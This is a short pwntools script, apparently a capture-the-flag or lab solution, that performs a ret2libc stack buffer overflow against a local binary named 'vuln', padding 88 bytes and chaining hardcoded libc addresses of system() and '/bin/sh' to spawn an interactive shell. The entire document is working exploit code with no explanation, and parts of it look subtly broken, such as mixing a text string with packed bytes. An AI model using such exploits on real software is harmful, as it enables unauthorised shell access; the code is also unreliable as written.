from pwn import *

system_addr = 0x7ffff7e12290 
binsh_addr = 0x7ffff7f745bd

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
ret_offset = 0x0000000000023b6a - libc.symbols['system']
ret_addr = system_addr + ret_offset
print(hex(ret_addr))

payload = "A" * 88 + p64(ret_addr) + p64(binsh_addr) + p64(system_addr) 
p = process("./vuln")
p.send(payload)
p.interactive()


